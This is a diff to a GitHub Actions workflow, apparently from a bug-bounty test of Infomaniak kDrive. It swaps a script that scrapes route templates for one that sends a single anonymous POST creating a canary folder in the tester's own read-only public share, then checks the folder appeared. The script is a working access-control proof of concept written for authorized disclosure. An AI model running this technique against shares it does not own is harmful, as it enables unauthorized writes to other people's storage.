@@ -1,4 +1,4 @@
-name: kDrive public folder exact route inspection
+name: kDrive public folder one-write canary
 
 on:
   push:
@@ -8,7 +8,7 @@ permissions:
   contents: read
 
 jobs:
-  exact-route:
+  one-write:
     runs-on: ubuntu-latest
     env:
       KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
@@ -16,75 +16,81 @@ jobs:
       - name: Install dependency
         run: python -m pip install --quiet requests
 
-      - name: Resolve public route templates without writing
+      - name: Attempt exactly one anonymous child-folder creation
         shell: python
         run: |
-          import html, os, re, sys
-          from urllib.parse import urljoin, urlparse
+          import json, os, re, sys, time
+          from urllib.parse import urlparse
           import requests
 
           token=os.environ.get('KDRIVE_TOKEN','')
           if not token: print('[STOP] missing token');sys.exit(2)
           print(f'::add-mask::{token}')
-          drive_id=3896576; folder_id=19
-          ua='kDrive-YWH-public-folder-recon/1.0 Infomaniak-YWH-Bugbounty'
+
+          drive_id=3896576
+          folder_id=19
+          ua='kDrive-YWH-public-folder-canary/1.0 Infomaniak-YWH-Bugbounty'
           auth={'Authorization':f'Bearer {token}','User-Agent':ua,'Accept':'application/json'}
 
+          # Get only our controlled folder/share metadata as owner.
           meta=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}',headers=auth,params={'with':'sharelink'},timeout=30)
-          mo=meta.json(); sd=(mo.get('data') or {}).get('sharelink') or {}
-          share_url=sd.get('url'); caps=sd.get('capabilities') or {}
-          print(f"[POLICY] can_edit={str(caps.get('can_edit')).lower()}")
-          if not share_url: print('[STOP] no share URL');sys.exit(0)
+          try:mo=meta.json()
+          except Exception: print(f'[STOP] owner meta HTTP={meta.status_code} non_json');sys.exit(0)
+          sd=(mo.get('data') or {}).get('sharelink') or {}
+          share_url=sd.get('url') if isinstance(sd,dict) else None
+          owner_caps=sd.get('capabilities') if isinstance(sd,dict) else {}
+          print(f"[SHARE_POLICY] owner_meta_HTTP={meta.status_code} can_edit={str((owner_caps or {}).get('can_edit')).lower()}")
+          if not share_url or (owner_caps or {}).get('can_edit') is not False:
+              print('[STOP] expected read-only public share not present');sys.exit(0)
           print(f'::add-mask::{share_url}')
 
-          s=requests.Session();s.headers.update({'User-Agent':ua})
-          p=s.get(share_url,timeout=30)
-          srcs=[]
-          for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']',p.text,re.I):
-              u=urljoin(p.url,html.unescape(m.group(1)))
-              if urlparse(u).hostname==urlparse(p.url).hostname and u not in srcs:srcs.append(u)
-          print(f'[ASSETS] script_count={len(srcs)}')
+          # Derive public share id from the actual share URL; never print it.
+          parts=[p for p in urlparse(share_url).path.split('/') if p]
+          try:
+              si=parts.index('share'); share_id=parts[si+1]
+          except Exception:
+              print('[STOP] could not derive public share id from share URL');sys.exit(0)
+          print(f'::add-mask::{share_id}')
 
-          needles=['apiUrlV3Public','apiUrlV2Public','publicBaseUrl(i,r)','publicBaseUrl','createFolder(i,r','/files/${r}/directory','/directory`']
-          found=0
-          for idx,u in enumerate(srcs[:6],1):
-              print(f'::add-mask::{u}')
-              r=s.get(u,timeout=30)
-              if r.status_code!=200:continue
-              t=r.text
-              for needle in needles:
-                  start=0
-                  while True:
-                      pos=t.find(needle,start)
-                      if pos<0:break
-                      a=max(0,pos-360);b=min(len(t),pos+700)
-                      sn=t[a:b].replace('\n',' ').replace('\r',' ')
-                      sn=re.sub(r'https?://[^"\'\s)]+','<url>',sn)
-                      sn=re.sub(r'[A-Za-z0-9_-]{40,}','<opaque>',sn)
-                      print(f'[CONTEXT {idx} {needle}] {sn[:1100]}')
-                      found+=1; start=pos+len(needle)
-                      if found>=30:break
-                  if found>=30:break
-              if found>=30:break
+          public_base=f'https://kdrive.infomaniak.com/3/app/{drive_id}/share/{share_id}'
+          print(f'::add-mask::{public_base}')
+          public_headers={'User-Agent':ua,'Accept':'application/json'}
 
-          # Explicitly pull likely URL-base definitions surrounding apiUrlV3Public/publicBaseUrl.
-          route_candidates=[]
-          for u in srcs[:6]:
-              try:t=s.get(u,timeout=30).text
-              except Exception:continue
-              for rx in [
-                  r'apiUrlV3Public[^,;}]{0,240}',
-                  r'publicBaseUrl\([^)]*\)\{return[^}]{0,350}\}',
-                  r'createFolder\([^)]*\)\{[^}]{0,700}\}',
-                  r'apiUrlV3[^,;}]{0,180}',
-              ]:
-                  for m in re.finditer(rx,t):
-                      x=m.group(0).replace('\n',' ')
-                      x=re.sub(r'https?://[^"\'\s)]+','<url>',x)
-                      x=re.sub(r'[A-Za-z0-9_-]{40,}','<opaque>',x)
-                      if x not in route_candidates:route_candidates.append(x[:900])
-                      if len(route_candidates)>=30:break
-                  if len(route_candidates)>=30:break
-              if len(route_candidates)>=30:break
-          for i,x in enumerate(route_candidates,1):print(f'[ROUTE {i}] {x}')
-          print(f'[RESULT] EXACT_ROUTE_INSPECTION_COMPLETE contexts={found} route_candidates={len(route_candidates)} no_write_attempt=true')
+          # Gate on current anonymous public capabilities before any write.
+          pre=requests.get(f'{public_base}/files/{folder_id}',headers=public_headers,timeout=30)
+          try:po=pre.json()
+          except Exception: print(f'[STOP] public meta HTTP={pre.status_code} non_json');sys.exit(0)
+          pd=po.get('data') or {}; pc=pd.get('capabilities') or {}
+          print(f"[PUBLIC_GATE] HTTP={pre.status_code} can_edit={str(pc.get('can_edit')).lower()} can_write={str(pc.get('can_write')).lower()} can_create_directory={str(pc.get('can_create_directory')).lower()} can_upload={str(pc.get('can_upload')).lower()}")
+          if not (pre.status_code==200 and pc.get('can_edit') is False and pc.get('can_write') is False and pc.get('can_create_directory') is True):
+              print('[STOP] capability mismatch no longer present; no write sent');sys.exit(0)
+
+          # Exactly one anonymous mutation in our own controlled folder.
+          canary=f'ywh-anon-create-canary-{int(time.time())}'
+          endpoint=f'{public_base}/files/{folder_id}/directory'
+          print(f'::add-mask::{endpoint}')
+          wr=requests.post(endpoint,
+              headers={**public_headers,'Content-Type':'application/json'},
+              json={'name':canary,'only_for_me':False},timeout=30)
+          print(f'[ANON_CREATE] HTTP={wr.status_code}')
+          try:wo=wr.json()
+          except Exception:
+              print('[ANON_CREATE] non_json=true body_not_printed=true');sys.exit(0)
+          we=wo.get('error') or {}; wd=wo.get('data') or {}
+          created_id=wd.get('id') if isinstance(wd,dict) else None
+          print(f"[ANON_CREATE] result={wo.get('result')} code={we.get('code')} reason={we.get('reason')} created_id={created_id}")
+
+          # Verify effect only through owner-authenticated listing of our controlled folder.
+          lst=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}/files',headers=auth,timeout=30)
+          try:lo=lst.json()
+          except Exception: print(f'[VERIFY] HTTP={lst.status_code} non_json');sys.exit(0)
+          items=lo.get('data') or []
+          matches=[x for x in items if isinstance(x,dict) and x.get('name')==canary]
+          owner_seen=bool(matches)
+          verified_id=(matches[0].get('id') if matches else None)
+          print(f'[VERIFY] HTTP={lst.status_code} owner_sees_canary={str(owner_seen).lower()} verified_id={verified_id}')
+
+          if wo.get('result')=='success' and owner_seen:
+              print('[RESULT] ANONYMOUS_CREATE_CONFIRMED_IN_CAN_EDIT_FALSE_PUBLIC_FOLDER')
+          else:
+              print('[RESULT] ANONYMOUS_CREATE_NOT_CONFIRMED')
